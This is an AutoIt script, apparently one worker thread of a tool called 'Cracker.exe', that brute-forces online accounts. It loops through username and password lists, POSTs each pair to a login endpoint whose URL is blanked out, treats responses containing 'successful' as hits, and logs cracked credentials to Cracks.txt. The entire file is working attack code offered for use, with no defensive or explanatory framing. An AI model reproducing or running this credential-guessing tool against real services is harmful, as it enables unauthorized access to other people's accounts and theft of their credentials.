#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_icon=orbz-air.ico
#AutoIt3Wrapper_UseAnsi=y
#AutoIt3Wrapper_Compression=4
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <Array.au3>
#include <WinHTTP.au3>
#include <WinHTTPConstants.au3>
#include <File.au3>
#include <INet.au3>

$oShell = ObjCreate("shell.application")
$num = $CmdLine[1]
Global $oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
Local $usernames, $passwords, $proxies
_FileReadToArray(@ScriptDir & "/tempdir/usernames" & $num & ".txt", $usernames)
_FileReadToArray(@ScriptDir & "/passwords.txt", $passwords)
_ArrayDelete($usernames, 0)
_ArrayDelete($passwords, 0)

Print("Thread " & $num & " has started.")
Local $cUser = 0, $cPass = 0, $error = 0
While 1

	If ProcessExists("Cracker.exe") = 0 Then
		Exit
	EndIf
	If UBound($passwords) = $cPass Then
		$cPass = 0
		$cUser += 1
	If UBound($usernames) = $cUser Then
		ExitLoop
	EndIf
	EndIf
	Switch CrackAccount($usernames[$cUser], $passwords[$cPass])
		Case -1
			Print("#" & $num & " Waiting 5 Min Then Starting")
			$Error += 1
			If $error = 5 Then
				Refresh()
				$error = 0
			EndIf
		Case 0
			Print("#" & $num & " Invalid - "&$usernames[$cUser]&":"&$passwords[$cPass])
			$cPass += 1
		Case 1
			Print("#" & $num & " Crack - "&$usernames[$cUser]&":"&$passwords[$cPass])
			FileWriteLine(@ScriptDir & "/Cracks.txt",$usernames[$cUser]&":"&$passwords[$cPass])
			Refresh()
			$cPass = 0
			$cUser += 1
	EndSwitch
WEnd
Print("Thread " & $num & " has finished cracking.")

Func CrackAccount($vUser, $vPass)
	$source = _HTTPRequest($oHTTP, "POST", "                                      ", "username=" & $vUser & "&password=" & $vPass )
	Select
		Case StringInStr($source, "Invalid")
			Return 0
		Case StringInStr($source, "successful")
			Return 1
		Case Else
			Return -1
	EndSelect
EndFunc

Func Print($oData)
	ConsoleWrite($oData & @CRLF)
EndFunc   ;==>Print

Func _HTTPRequest($Wnd, $oMethod, $oURL, $oData = "")
    $Wnd.Open($oMethod, $oURL, False)
    If $oMethod = "POST" Then $Wnd.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
    $Wnd.Send($oData)
    Return $Wnd.ResponseText
EndFunc

Func Refresh()
	$oShell = ObjCreate("shell.application")
	$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
EndFunc